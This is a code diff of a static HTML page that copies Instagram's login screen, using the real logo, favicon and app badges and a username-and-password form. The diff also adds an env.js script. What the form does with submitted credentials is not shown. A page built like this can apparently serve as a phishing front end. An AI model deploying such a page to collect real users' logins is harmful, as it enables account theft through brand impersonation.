@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="stylesheet" href="static/style.css">
     <!-- Favicon -->
     <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
 </head>
+
 <body>
     <div class="main-container">
         <!-- Phone Image Section (hidden on small screens, shown on large) -->
@@ -17,9 +19,10 @@
         <div class="login-section">
             <div class="box login-box">
                 <div class="logo">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                        alt="Instagram">
                 </div>
-                
+
                 <form id="loginForm">
                     <div class="input-group">
                         <input type="text" id="username" placeholder="Phone number, username, or email" required>
@@ -27,7 +30,7 @@
                     <div class="input-group">
                         <input type="password" id="password" placeholder="Password" required>
                     </div>
-                    
+
                     <button type="submit" id="loginBtn">Log in</button>
                 </form>
 
@@ -53,8 +56,10 @@
             <div class="get-app">
                 <p>Get the app.</p>
                 <div class="app-stores">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png"
+                        alt="Get it on Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+                        alt="Get it from Microsoft">
                 </div>
             </div>
         </div>
@@ -95,6 +100,8 @@
         </div>
     </div>
 
-    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script src="static/env.js"></script>
+    <script src="static/script.js"></script>
 </body>
+
 </html>
